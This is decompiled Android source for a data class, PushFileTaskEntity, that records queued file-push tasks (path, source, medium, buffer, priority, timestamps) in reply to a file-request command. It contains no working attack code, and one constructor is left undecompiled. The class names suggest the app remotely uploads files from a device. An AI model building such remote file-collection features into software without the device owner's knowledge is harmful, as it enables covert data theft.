package com.hawkshaw.library.datalayer.room.files;

import B3.f;
import D3.b;
import E3.q0;
import Y1.K;
import com.hawkshaw.library.datalayer.models.Command;
import java.io.File;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import p3.q;
import w3.w;

@f
public final class PushFileTaskEntity {
    /* access modifiers changed from: private */
    public static final KSerializer[] $childSerializers = {null, Command.FileRequest.Source.Companion.serializer(), Command.FileRequest.Medium.Companion.serializer(), null, null, null, null, null, null};
    public static final Companion Companion = new Companion((j3.f) null);
    private final int buffer;
    private int id;
    private final long lastPushTimestamp;
    private final long length;
    private final Command.FileRequest.Medium medium;
    private final String path;
    private final int priority;
    private final Command.FileRequest.Source source;
    private final long timestamp;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return PushFileTaskEntity$$serializer.INSTANCE;
        }
    }

    public /* synthetic */ PushFileTaskEntity(int i5, String str, Command.FileRequest.Source source2, Command.FileRequest.Medium medium2, int i6, long j5, long j6, long j7, int i7, int i8, q0 q0Var) {
        if (7 == (i5 & 7)) {
            this.path = str;
            this.source = source2;
            this.medium = medium2;
            if ((i5 & 8) == 0) {
                this.buffer = 1048576;
            } else {
                this.buffer = i6;
            }
            if ((i5 & 16) == 0) {
                this.length = new File(str).length();
            } else {
                this.length = j5;
            }
            if ((i5 & 32) == 0) {
                this.timestamp = System.currentTimeMillis();
            } else {
                this.timestamp = j6;
            }
            if ((i5 & 64) == 0) {
                this.lastPushTimestamp = 0;
            } else {
                this.lastPushTimestamp = j7;
            }
            if ((i5 & 128) == 0) {
                this.priority = 1;
            } else {
                this.priority = i7;
            }
            if ((i5 & 256) == 0) {
                this.id = 0;
            } else {
                this.id = i8;
            }
        } else {
            w.x(i5, 7, PushFileTaskEntity$$serializer.INSTANCE.getDescriptor());
            throw null;
        }
    }

    public static /* synthetic */ PushFileTaskEntity copy$default(PushFileTaskEntity pushFileTaskEntity, String str, Command.FileRequest.Source source2, Command.FileRequest.Medium medium2, int i5, long j5, long j6, long j7, int i6, int i7, Object obj) {
        PushFileTaskEntity pushFileTaskEntity2 = pushFileTaskEntity;
        int i8 = i7;
        return pushFileTaskEntity.copy((i8 & 1) != 0 ? pushFileTaskEntity2.path : str, (i8 & 2) != 0 ? pushFileTaskEntity2.source : source2, (i8 & 4) != 0 ? pushFileTaskEntity2.medium : medium2, (i8 & 8) != 0 ? pushFileTaskEntity2.buffer : i5, (i8 & 16) != 0 ? pushFileTaskEntity2.length : j5, (i8 & 32) != 0 ? pushFileTaskEntity2.timestamp : j6, (i8 & 64) != 0 ? pushFileTaskEntity2.lastPushTimestamp : j7, (i8 & 128) != 0 ? pushFileTaskEntity2.priority : i6);
    }

    public static final /* synthetic */ void write$Self$library_release(PushFileTaskEntity pushFileTaskEntity, b bVar, SerialDescriptor serialDescriptor) {
        KSerializer[] kSerializerArr = $childSerializers;
        q qVar = (q) bVar;
        qVar.f0(serialDescriptor, 0, pushFileTaskEntity.path);
        qVar.e0(serialDescriptor, 1, kSerializerArr[1], pushFileTaskEntity.source);
        qVar.e0(serialDescriptor, 2, kSerializerArr[2], pushFileTaskEntity.medium);
        if (qVar.q(serialDescriptor) || pushFileTaskEntity.buffer != 1048576) {
            qVar.c0(3, pushFileTaskEntity.buffer, serialDescriptor);
        }
        if (qVar.q(serialDescriptor) || pushFileTaskEntity.length != new File(pushFileTaskEntity.path).length()) {
            qVar.d0(serialDescriptor, 4, pushFileTaskEntity.length);
        }
        if (qVar.q(serialDescriptor) || pushFileTaskEntity.timestamp != System.currentTimeMillis()) {
            qVar.d0(serialDescriptor, 5, pushFileTaskEntity.timestamp);
        }
        if (qVar.q(serialDescriptor) || pushFileTaskEntity.lastPushTimestamp != 0) {
            qVar.d0(serialDescriptor, 6, pushFileTaskEntity.lastPushTimestamp);
        }
        if (qVar.q(serialDescriptor) || pushFileTaskEntity.priority != 1) {
            qVar.c0(7, pushFileTaskEntity.priority, serialDescriptor);
        }
        if (qVar.q(serialDescriptor) || pushFileTaskEntity.id != 0) {
            qVar.c0(8, pushFileTaskEntity.id, serialDescriptor);
        }
    }

    public final String component1() {
        return this.path;
    }

    public final Command.FileRequest.Source component2() {
        return this.source;
    }

    public final Command.FileRequest.Medium component3() {
        return this.medium;
    }

    public final int component4() {
        return this.buffer;
    }

    public final long component5() {
        return this.length;
    }

    public final long component6() {
        return this.timestamp;
    }

    public final long component7() {
        return this.lastPushTimestamp;
    }

    public final int component8() {
        return this.priority;
    }

    public final PushFileTaskEntity copy(String str, Command.FileRequest.Source source2, Command.FileRequest.Medium medium2, int i5, long j5, long j6, long j7, int i6) {
        K.n(str, "path");
        K.n(source2, "source");
        Command.FileRequest.Medium medium3 = medium2;
        K.n(medium3, "medium");
        return new PushFileTaskEntity(str, source2, medium3, i5, j5, j6, j7, i6);
    }

    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (!(obj instanceof PushFileTaskEntity)) {
            return false;
        }
        PushFileTaskEntity pushFileTaskEntity = (PushFileTaskEntity) obj;
        return K.f(this.path, pushFileTaskEntity.path) && this.source == pushFileTaskEntity.source && this.medium == pushFileTaskEntity.medium && this.buffer == pushFileTaskEntity.buffer && this.length == pushFileTaskEntity.length && this.timestamp == pushFileTaskEntity.timestamp && this.lastPushTimestamp == pushFileTaskEntity.lastPushTimestamp && this.priority == pushFileTaskEntity.priority;
    }

    public final int getBuffer() {
        return this.buffer;
    }

    public final int getId() {
        return this.id;
    }

    public final long getLastPushTimestamp() {
        return this.lastPushTimestamp;
    }

    public final long getLength() {
        return this.length;
    }

    public final Command.FileRequest.Medium getMedium() {
        return this.medium;
    }

    public final String getPath() {
        return this.path;
    }

    public final int getPriority() {
        return this.priority;
    }

    public final Command.FileRequest.Source getSource() {
        return this.source;
    }

    public final long getTimestamp() {
        return this.timestamp;
    }

    public int hashCode() {
        int hashCode = this.source.hashCode();
        int hashCode2 = this.medium.hashCode();
        int hashCode3 = Integer.hashCode(this.buffer);
        int hashCode4 = Long.hashCode(this.length);
        int hashCode5 = Long.hashCode(this.timestamp);
        int hashCode6 = Long.hashCode(this.lastPushTimestamp);
        return Integer.hashCode(this.priority) + ((hashCode6 + ((hashCode5 + ((hashCode4 + ((hashCode3 + ((hashCode2 + ((hashCode + (this.path.hashCode() * 31)) * 31)) * 31)) * 31)) * 31)) * 31)) * 31);
    }

    public final void setId(int i5) {
        this.id = i5;
    }

    public String toString() {
        String str = this.path;
        Command.FileRequest.Source source2 = this.source;
        Command.FileRequest.Medium medium2 = this.medium;
        int i5 = this.buffer;
        long j5 = this.length;
        long j6 = this.timestamp;
        long j7 = this.lastPushTimestamp;
        int i6 = this.priority;
        return "PushFileTaskEntity(path=" + str + ", source=" + source2 + ", medium=" + medium2 + ", buffer=" + i5 + ", length=" + j5 + ", timestamp=" + j6 + ", lastPushTimestamp=" + j7 + ", priority=" + i6 + ")";
    }

    /* JADX WARNING: Illegal instructions before constructor call */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public /* synthetic */ PushFileTaskEntity(java.lang.String r15, com.hawkshaw.library.datalayer.models.Command.FileRequest.Source r16, com.hawkshaw.library.datalayer.models.Command.FileRequest.Medium r17, int r18, long r19, long r21, long r23, int r25, int r26, j3.f r27) {
        /*
            r14 = this;
            r0 = r26
            r1 = r0 & 8
            if (r1 == 0) goto L_0x000a
            r1 = 1048576(0x100000, float:1.469368E-39)
            r6 = r1
            goto L_0x000c
        L_0x000a:
            r6 = r18
        L_0x000c:
            r1 = r0 & 16
            if (r1 == 0) goto L_0x001c
            java.io.File r1 = new java.io.File
            r3 = r15
            r1.<init>(r15)
            long r1 = r1.length()
            r7 = r1
            goto L_0x001f
        L_0x001c:
            r3 = r15
            r7 = r19
        L_0x001f:
            r1 = r0 & 32
            if (r1 == 0) goto L_0x0029
            long r1 = java.lang.System.currentTimeMillis()
            r9 = r1
            goto L_0x002b
        L_0x0029:
            r9 = r21
        L_0x002b:
            r1 = r0 & 64
            if (r1 == 0) goto L_0x0033
            r1 = 0
            r11 = r1
            goto L_0x0035
        L_0x0033:
            r11 = r23
        L_0x0035:
            r0 = r0 & 128(0x80, float:1.8E-43)
            if (r0 == 0) goto L_0x003c
            r0 = 1
            r13 = r0
            goto L_0x003e
        L_0x003c:
            r13 = r25
        L_0x003e:
            r2 = r14
            r3 = r15
            r4 = r16
            r5 = r17
            r2.<init>(r3, r4, r5, r6, r7, r9, r11, r13)
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity.<init>(java.lang.String, com.hawkshaw.library.datalayer.models.Command$FileRequest$Source, com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium, int, long, long, long, int, int, j3.f):void");
    }

    public PushFileTaskEntity(String str, Command.FileRequest.Source source2, Command.FileRequest.Medium medium2, int i5, long j5, long j6, long j7, int i6) {
        K.n(str, "path");
        K.n(source2, "source");
        K.n(medium2, "medium");
        this.path = str;
        this.source = source2;
        this.medium = medium2;
        this.buffer = i5;
        this.length = j5;
        this.timestamp = j6;
        this.lastPushTimestamp = j7;
        this.priority = i6;
    }
}
